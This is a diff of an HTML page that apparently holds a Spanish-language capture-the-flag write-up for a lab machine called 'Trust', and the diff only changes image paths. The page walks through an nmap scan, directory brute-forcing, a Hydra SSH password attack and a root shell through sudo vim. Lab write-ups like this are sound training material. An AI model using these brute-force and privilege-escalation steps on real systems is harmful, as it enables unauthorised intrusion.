@@ -52,13 +52,13 @@
             <h3 class="section-title">1. Recolección de Información</h3>
             <h4>Escaneo con Nmap</h4>
             <pre><code>nmap -sS -sCV --open --min-rate 5000 -p- 172.18.0.2 -oN tcp_scan</code></pre>
-            <img src="../assets/images/trust/trust_nmap.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_nmap.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
             <p><strong>Resultados:</strong> Puertos abiertos: 22 (SSH), 80 (HTTP).</p>
             
             <h4>Enumeración Web</h4>
             <p>Acceso al servicio HTTP:</p>
             <pre><code>http://172.18.0.2:80</code></pre>
-            <img src="../assets/images/trust/trust_web_apache.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_web_apache.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
 
             <h4>DirBuster</h4>
             <p>Configuración usada:</p>
@@ -66,17 +66,17 @@
                 <li>Wordlist: <code>directory-list-2.3-medium.txt</code></li>
                 <li>Archivo crítico encontrado: <code>secret.php</code></li>
             </ul>
-            <img src="../assets/images/trust/trust_dirbuster.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
-            <img src="../assets/images/trust/trust_dirbuster_2.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_dirbuster.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_dirbuster_2.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
 
             <p>Contenido de secret.php:</p>
             <blockquote>Hola Mario,<br>Esta web no se puede hackear.</blockquote>
-            <img src="../assets/images/trust/trust_secretphp.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_secretphp.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
 
             <h3 class="section-title">2. Explotación</h3>
             <h4>Fuerza Bruta con Hydra</h4>
             <pre><code>hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2</code></pre>
-            <img src="../assets/images/trust/trust_hydra.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_hydra.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
             <p><strong>Credenciales obtenidas:</strong> Usuario: <code>mario</code> | Contraseña: <code>chocolate</code></p>
             
             <h4>Acceso por SSH</h4>
@@ -86,15 +86,15 @@
             <h3 class="section-title">3. Escalada de Privilegios</h3>
             <h4>Verificación de permisos Sudo</h4>
             <pre><code>sudo -l</code></pre>
-            <img src="../assets/images/trust/trust_sudo_-l.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_sudo_-l.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
             <p><strong>Resultado:</strong> Permiso para ejecutar <code>/usr/bin/vim</code> como root.</p>
             
             <h4>Abuso de Vim (GTFOBins)</h4>
             <pre><code>sudo /usr/bin/vim
 :!/bin/sh  # Dentro de Vim
 whoami  # Output: root</code></pre>
-            <img src="../assets/images/trust/trust_vim.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
-            <img src="../assets/images/trust/trust_root.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_vim.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
+            <img src="assets/images/trust/trust_root.png" alt="Resultado `Nmap" style="max-width: 100%; border: 1px solid #333;">
 
             <h3 class="section-title">4. Conclusión</h3>
             <ul>
